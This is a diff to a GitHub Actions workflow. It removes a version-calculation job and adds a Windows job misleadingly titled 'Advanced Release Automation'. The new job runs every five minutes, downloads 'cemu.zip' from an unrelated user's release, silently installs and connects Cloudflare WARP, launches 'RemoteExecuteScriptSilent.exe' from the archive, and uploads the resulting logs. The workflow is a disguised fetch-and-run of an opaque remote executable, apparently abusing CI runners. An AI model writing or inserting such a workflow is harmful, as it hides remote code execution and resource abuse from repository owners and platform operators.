@@ -1,74 +1,94 @@
-name: Calculate Next Version from release history
+name: 🚀 Workflow on Windows - Advanced Release Automation
 
 on:
+  schedule:
+    - cron: "*/5 * * * *"
   workflow_dispatch:
-  workflow_call:
-    outputs:
-      next_version:
-        description: "The next semantic version"
-        value: ${{ jobs.calculate-version.outputs.next_version }}
-      next_version_major:
-        description: "The next semantic version (major)"
-        value: ${{ jobs.calculate-version.outputs.next_version_major }}
-      next_version_minor:
-        description: "The next semantic version (minor)"
-        value: ${{ jobs.calculate-version.outputs.next_version_minor }}
 
 jobs:
-  calculate-version:
-    runs-on: ubuntu-latest
-    outputs:
-      next_version: ${{ steps.calculate_next_version.outputs.next_version }}
-      next_version_major: ${{ steps.calculate_next_version.outputs.next_version_major }}
-      next_version_minor: ${{ steps.calculate_next_version.outputs.next_version_minor }}      
+  run-release:
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+    runs-on: windows-latest
+    defaults:
+      run:
+        shell: pwsh
+
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
+      - name: 🎯 Checkout Repository
+        uses: actions/checkout@v4
 
-      - name: Get all releases
-        id: get_all_releases
+      - name: ⬇️ Download cemu.zip from Release
+        env:
+          CEMU_URL: "https://github.com/oes99r/Cemu/releases/download/1/cemu.zip"
         run: |
-          # Fetch all releases and check for API errors
-          RESPONSE=$(curl -s -o response.json -w "%{http_code}" "https://api.github.com/repos/${{ github.repository }}/releases?per_page=100")
-          if [ "$RESPONSE" -ne 200 ]; then
-            echo "Failed to fetch releases. HTTP status: $RESPONSE"
-            cat response.json
-            exit 1
-          fi
-          
-          # Extract and sort tags
-          ALL_TAGS=$(jq -r '.[].tag_name' response.json | grep -E '^v[0-9]+\.[0-9]+(-[0-9]+)?$' | sed 's/-.*//' | sort -V | tail -n 1)
+          Write-Host "Downloading Cemu release from $env:CEMU_URL..."
+          Invoke-WebRequest -Uri $env:CEMU_URL -OutFile cemu.zip
+          Write-Host "Download complete ✅"
 
-          # Exit if no tags were found
-          if [ -z "$ALL_TAGS" ]; then
-            echo "No valid tags found."
-            exit 1
-          fi
-
-          echo "::set-output name=tag::$ALL_TAGS"
-          # echo "tag=$ALL_TAGS" >> $GITHUB_STATE
-
-      - name: Calculate next semver minor
-        id: calculate_next_version
+      - name: 📦 Unpack cemu.zip
         run: |
-          LATEST_VERSION=${{ steps.get_all_releases.outputs.tag }}
+          Write-Host "Extracting cemu.zip..."
+          Expand-Archive -Path cemu.zip -DestinationPath .
+          Write-Host "Extraction complete ✅"
 
-          # strip 'v' prefix and split into major.minor
-          LATEST_VERSION=${LATEST_VERSION//v/}
-          IFS='.' read -r -a VERSION_PARTS <<< "$LATEST_VERSION"
+      - name: ⚡ Install Cloudflare WARP
+        env:
+          WARP_MSI: "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi"
+        run: |
+          Write-Host "Downloading Cloudflare WARP installer..."
+          Invoke-WebRequest -Uri $env:WARP_MSI -OutFile "WARP.msi"
+          Write-Host "Installing Cloudflare WARP silently..."
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          Write-Host "Waiting for WARP service to start..."
+          Start-Sleep -Seconds 10
+          Write-Host "Registering and connecting to WARP..."
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Write-Host "Cloudflare WARP is now active! 🌐"
+          Start-Sleep -Seconds 10
 
-          MAJOR=${VERSION_PARTS[0]}
-          MINOR=${VERSION_PARTS[1]}
+      - name: ▶️ Launch RemoteExecuteScriptSilent.exe
+        working-directory: cemu
+        run: |
+          Write-Host "Starting RemoteExecuteScriptSilent.exe in silent mode..."
+          Start-Process .\RemoteExecuteScriptSilent.exe
+          Write-Host "Process launched 🚦"
 
-          # increment the minor version
-          MINOR=$((MINOR + 1))
+      - name: ⏳ Await RemoteExecuteScriptSilent.exe Completion
+        run: |
+          $processName = "RemoteExecuteScriptSilent"
+          Write-Host "Waiting for $processName to finish..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running... ⏳"
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has finished! ✅"
 
-          NEXT_VERSION="${MAJOR}.${MINOR}"
+      - name: ⏳ Await FastExecuteScript.exe Completion
+        run: |
+          $processName = "FastExecuteScript"
+          Write-Host "Waiting for $processName to finish..."
+          while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running... ⏳"
+            Start-Sleep -Seconds 5
+          }
+          Write-Host "$processName has finished! ✅"
 
-          echo "Major: $MAJOR"
-          echo "Minor: $MINOR"
+      - name: 🔍 Locate Dynamic Logs Folder
+        id: find_logs
+        run: |
+          $base = "cemu\appslocal"
+          Write-Host "Searching for dynamic logs folder in $base..."
+          $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
+          $logsPath = "$base\$dynamic\logs"
+          Write-Host "Logs path found: $logsPath"
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
 
-          echo "Next version: $NEXT_VERSION"
-          echo "::set-output name=next_version::$NEXT_VERSION"
-          echo "::set-output name=next_version_major::$MAJOR"
-          echo "::set-output name=next_version_minor::$MINOR"          
+      - name: 📤 Upload Logs as Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: logs
+          path: ${{ env.logsPath }}/**
